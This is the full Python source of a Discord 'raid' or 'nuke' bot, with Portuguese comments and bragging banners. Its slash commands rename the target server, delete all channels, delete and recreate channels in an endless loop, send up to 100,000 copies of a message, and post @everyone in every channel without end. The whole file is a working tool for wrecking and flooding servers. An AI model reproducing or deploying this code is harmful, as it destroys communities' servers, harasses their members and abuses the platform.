import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import random
import sys
import os
import time

# ==============================================
# TELA DE ABERTURA
# ==============================================
def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

limpar_tela()
print("Codded by Kryz….")
time.sleep(1.2)
limpar_tela()
print("Byee!")
time.sleep(0.8)
limpar_tela()

# ==============================================
# PAINEL PRINCIPAL
# ==============================================
print("="*60)
print("""
                  ⢠
           ⢰⣿⡤⠄
        ⢀⣤⣶⢿⣿⡇
        ⠼⣿⣧⣸⣿⣧⣤⣀⡀
         ⠘⣿⣿⣿⣿⣿⣿⣷⡀
          ⠘⣿⣿⣿⣿⣿⣿⣷. | Kryz, the king.
     ⢀⡀⣠⣤⣦⣴⣿⣿⣿⣿⠛⠉⠁
     ⣿⣿⣿⢿⠿⣿⣿⣿⣿⡏
    ⣸⣿⣿⡟   ⠈⢿⣿⣿⠂
⣠⣄⣶⣤⣿⠋      ⣼⣿⡟
⠉⠛⠿⢿⠃      ⣠⣿⣿⡄
           ⢻⣿⠋
          ⢀⣿⠃
          ⢸⣿⣇
           ⠙⠋
""")
print("="*60)

# Token solicitado no terminal
TOKEN = input("Token: ").strip()
if not TOKEN:
    print("Token obrigatório.")
    sys.exit(1)

print("Iniciando...\n")

# ==============================================
# CONFIGURAÇÕES
# ==============================================
NOME_SERVIDOR = "𝐎𝐬𝐢𝐫𝐲𝟗𝟎𝟗𝐱 𝐎𝐍 𝐓𝐎𝐏!"
NOME_CANAL_BASE = "Raid By Osiry"
NOME_BOT = "v909x"

SIMBOLOS = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
LETRAS_RUSSAS = ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]

def sufixo_aleatorio():
    tipo = random.choice(["simbolo", "russa", "mistura"])
    if tipo == "simbolo":
        return f" {random.choice(SIMBOLOS)}{random.choice(SIMBOLOS)}"
    elif tipo == "russa":
        return f" {random.choice(LETRAS_RUSSAS)}{random.choice(LETRAS_RUSSAS)}{random.choice(LETRAS_RUSSAS)}"
    else:
        return f" {random.choice(SIMBOLOS)}{random.choice(LETRAS_RUSSAS)}{random.choice(SIMBOLOS)}"

MENSAGEM_EVERYONE = "@everyone @here\n────୨ৎ──── 𝐎𝐒𝐈𝐑𝐘𝟗𝟎𝟗𝐱 𝐎𝐍 𝐓𝐎𝐏!!! ────୨ৎ────"
QTD_CANAIS_POR_LOOP = 30

ativo_geral = False

# ==============================================
# BOT
# ==============================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

comandos_registrados = False

@bot.event
async def on_ready():
    global comandos_registrados
    if not comandos_registrados:
        try:
            await tree.sync()
            comandos_registrados = True
        except Exception as e:
            print(f"Sincronização: {e}")
    limpar_tela()
    print("="*60)
    print(f"✅ Bot conectado: {NOME_BOT}")
    print(f"📋 Servidores ativos: {len(bot.guilds)}")
    print("="*60)
    print("COMANDOS DISPONÍVEIS:")
    print("  /knuke    → Apaga E cria canais AO MESMO TEMPO, sem parar")
    print("  /sms      → Envia mensagem várias vezes (1 a 100000)")
    print("  /delet    → Apaga todos os canais uma vez")
    print("  /everyone → @everyone infinito em todos os canais")
    print("  /stop     → PARA TUDO")
    print("="*60)
    try:
        await bot.user.edit(username=NOME_BOT)
    except:
        pass

# ⚡ /knuke — APAGA E CRIA AO MESMO TEMPO, SEM PARAR
@tree.command(name="knuke", description="Apaga E cria canais AO MESMO TEMPO em loop infinito")
async def cmd_knuke(interaction: discord.Interaction):
    global ativo_geral
    ativo_geral = True
    await interaction.response.send_message(" KNUKE ", ephemeral=True)
    guild = interaction.guild

    try: await guild.edit(name=NOME_SERVIDOR)
    except: pass

    ciclo = 1
    while ativo_geral:
        print(f"\n💥 CICLO {ciclo} — Apagando E Criando AO MESMO TEMPO...")

        # ⚡ TUDO ACONTECE AO MESMO TEMPO!
        tarefas_apagar = [c.delete() for c in guild.channels]
        tarefas_criar = [guild.create_text_channel(f"{NOME_CANAL_BASE}{sufixo_aleatorio()}") 
                         for _ in range(QTD_CANAIS_POR_LOOP)]
        
        # Executa APAGAR + CRIAR SIMULTANEAMENTE
        await asyncio.gather(*tarefas_apagar, *tarefas_criar, return_exceptions=True)
        
        print(f"   ✅ Ciclo {ciclo} concluído — Apagado e Recriado simultaneamente!")
        ciclo += 1
        await asyncio.sleep(0.05)

    print("🛑 KNUKE parado")
    await interaction.followup.send("🛑 KNUKE finalizado.")

# ⚡ /sms — MENSAGEM EM MASSA
@tree.command(name="sms", description="Envia uma mensagem várias vezes")
@app_commands.describe(frase="Texto a enviar", quantidade="Número de 1 a 100000")
async def cmd_sms(interaction: discord.Interaction, frase: str, quantidade: int):
    global ativo_geral
    ativo_geral = True
    quantidade = max(1, min(quantidade, 100000))
    await interaction.response.send_message(f"📤 Enviando: {frase} × {quantidade}x", ephemeral=True)
    
    lote = []
    for i in range(quantidade):
        if not ativo_geral: break
        lote.append(interaction.channel.send(frase))
        if len(lote) >= 50:
            await asyncio.gather(*lote, return_exceptions=True)
            lote = []
            await asyncio.sleep(0.01)
    
    if lote:
        await asyncio.gather(*lote, return_exceptions=True)
    
    print(f"✅ {quantidade} mensagens enviadas")
    await interaction.followup.send(f"✅ Concluído: {quantidade} mensagens enviadas!")

# ⚡ /delet — APAGAR TODOS OS CANAIS UMA VEZ
@tree.command(name="delet", description="Apaga todos os canais do servidor")
async def cmd_delet(interaction: discord.Interaction):
    global ativo_geral
    ativo_geral = True
    await interaction.response.send_message("🗑️ Apagando todos os canais...", ephemeral=True)
    canais = interaction.guild.channels
    await asyncio.gather(*[c.delete() for c in canais], return_exceptions=True)
    print(f"✅ {len(canais)} canais apagados")

# ⚡ /everyone — @everyone INFINITO
@tree.command(name="everyone", description="@everyone infinito em TODOS os canais")
async def cmd_everyone(interaction: discord.Interaction):
    global ativo_geral
    ativo_geral = True
    await interaction.response.send_message("🔔 @EVERYONE INFINITO — ATIVADO!", ephemeral=True)
    guild = interaction.guild
    print("🔔 Everyone infinito iniciado — digite /stop para parar")
    
    while ativo_geral:
        canais_validos = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        await asyncio.gather(*[c.send(MENSAGEM_EVERYONE) for c in canais_validos], return_exceptions=True)
        await asyncio.sleep(0.03)

# ⚡ /stop — PARAR TUDO
@tree.command(name="stop", description="Para TODOS os comandos em execução")
async def cmd_stop(interaction: discord.Interaction):
    global ativo_geral
    ativo_geral = False
    await interaction.response.send_message("🛑 TODOS os processos PARADOS!", ephemeral=True)
    print("🛑 Todos os comandos parados")

# ==============================================
# EXECUÇÃO
# ==============================================
try:
    bot.run(TOKEN)
except discord.LoginFailure:
    limpar_tela()
    print("❌ Token inválido. Verifique e tente novamente.")
except Exception as e:
    limpar_tela()
    print(f"❌ Erro: {e}")